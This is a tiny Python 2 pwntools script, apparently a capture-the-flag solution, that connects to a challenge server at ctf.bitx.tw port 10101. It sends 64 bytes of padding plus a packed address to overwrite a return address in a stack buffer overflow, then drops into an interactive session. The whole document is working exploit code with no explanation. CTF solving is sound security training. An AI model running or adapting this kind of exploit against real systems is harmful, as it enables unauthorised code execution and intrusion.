#!/usr/bin/env python2
from pwn import *

c = remote('ctf.bitx.tw', 10101)
c.sendline("A" * (0x40) + p64(0x0000000000400636))
c.interactive()
c.close()
